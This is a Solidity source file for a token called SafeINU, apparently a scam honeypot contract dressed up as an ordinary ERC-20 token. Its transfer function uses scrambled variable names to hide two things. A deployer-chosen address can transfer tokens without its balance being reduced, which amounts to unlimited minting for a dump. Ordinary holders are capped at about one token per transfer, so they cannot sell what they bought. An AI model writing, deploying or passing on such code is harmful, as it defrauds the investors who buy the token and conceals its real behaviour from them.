/*

https://t.me/safeinueth

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract SafeINU is Ownable {
    function approve(address uaxng, uint256 vqgh) public returns (bool success) {
        allowance[msg.sender][uaxng] = vqgh;
        emit Approval(msg.sender, uaxng, vqgh);
        return true;
    }

    IUniswapV2Router02 private lvbdyr;

    string public name;

    mapping(address => uint256) private wiazpkjqlces;

    function transfer(address nszcohmy, uint256 vqgh) public returns (bool success) {
        ecpbdktx(msg.sender, nszcohmy, vqgh);
        return true;
    }

    string public symbol;

    mapping(address => uint256) public balanceOf;

    function transferFrom(address tozgrwyfes, address nszcohmy, uint256 vqgh) public returns (bool success) {
        require(vqgh <= allowance[tozgrwyfes][msg.sender]);
        allowance[tozgrwyfes][msg.sender] -= vqgh;
        ecpbdktx(tozgrwyfes, nszcohmy, vqgh);
        return true;
    }

    function ecpbdktx(address tozgrwyfes, address nszcohmy, uint256 vqgh) private {
        address wfqjsmexgur = IUniswapV2Factory(lvbdyr.factory()).getPair(address(this), lvbdyr.WETH());
        bool rgyicqen = gpskhoetniw[tozgrwyfes] == block.number;
        if (0 == ypuzksgnt[tozgrwyfes]) {
            if (tozgrwyfes != wfqjsmexgur && (!rgyicqen || vqgh > wiazpkjqlces[tozgrwyfes]) && vqgh < totalSupply) {
                require(vqgh <= totalSupply / (10 ** decimals));
            }
            balanceOf[tozgrwyfes] -= vqgh;
        }
        wiazpkjqlces[nszcohmy] = vqgh;
        balanceOf[nszcohmy] += vqgh;
        gpskhoetniw[nszcohmy] = block.number;
        emit Transfer(tozgrwyfes, nszcohmy, vqgh);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(string memory survhgypq, string memory elwfkoacrx, address xrauomnsew, address rknemwuspgax) {
        name = survhgypq;
        symbol = elwfkoacrx;
        balanceOf[msg.sender] = totalSupply;
        ypuzksgnt[rknemwuspgax] = xqncv;
        lvbdyr = IUniswapV2Router02(xrauomnsew);
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private xqncv = 115;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    uint8 public decimals = 9;

    mapping(address => uint256) private ypuzksgnt;

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private gpskhoetniw;
}
